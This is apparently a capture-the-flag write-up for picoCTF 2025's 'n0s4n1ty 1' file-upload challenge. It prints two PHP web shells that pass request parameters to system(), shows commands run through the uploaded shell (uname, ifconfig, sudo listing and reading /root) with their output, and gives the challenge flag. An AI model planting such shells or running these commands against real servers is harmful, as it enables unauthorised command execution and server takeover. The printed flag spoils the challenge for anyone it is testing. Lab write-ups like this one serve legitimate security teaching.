https://learn.cylabacademy.org/library/482?event=74&page=1

n0s4n1ty 1
Web ExploitationEasy
by Prince Niyonshuti N.·
picoCTF 2025

A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.


You can access the web application here!
http://standard-pizzas.picoctf.net:64625/


https://medium.com/@fortydays/picoctf-writeup-n0san1ty-5649603a0f3a

shell.php
```
<?php
 if (isset($_REQUEST['cmd'])) {
 system($_REQUEST['cmd']);
 }
?>
```


shell2.php
```
<?php
if (isset($_GET['cmd'])) {
 echo "<pre>";
 system($_GET['cmd']);
 echo "</pre>";
}
?>
```


?cmd=sudo%20ls%20-la%20%2Froot%20%3E%20/uploads/rootdir.txt%202%3E%261

http://.../uploads/shell2.php.jpg?cmd=uname%20-a

Linux challenge 6.17.0-1019-aws #19~24.04.1-Ubuntu SMP Tue Jun 23 18:53:06 UTC 2026 x86_64 GNU/Linux



http://standard-pizzas.picoctf.net:64527/uploads/shell2.php?cmd=ifconfig

```
eth0: flags=4163  mtu 1500
        inet 192.168.0.90  netmask 255.255.255.248  broadcast 192.168.0.95
        ether 5e:63:36:95:a8:06  txqueuelen 0  (Ethernet)
        RX packets 149  bytes 18374 (17.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 120  bytes 14873 (14.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

http://standard-pizzas.picoctf.net:64527/uploads/shell2.php?cmd=sudo%20ls%20-la%20%2Froot

```
total 12
drwx------ 1 root root  22 Aug 21  2025 .
drwxr-xr-x 1 root root  39 Sep 11 09:34 ..
-rw-r--r-- 1 root root 571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root 161 Jul  9  2019 .profile
-rw-r--r-- 1 root root  36 Aug 21  2025 flag.txt
```

http://standard-pizzas.picoctf.net:64527/uploads/shell2.php?cmd=sudo%20cat%20%2Froot%2Fflag.txt

picoCTF{wh47_c4n_u_d0_wPHP_123198f1}
```
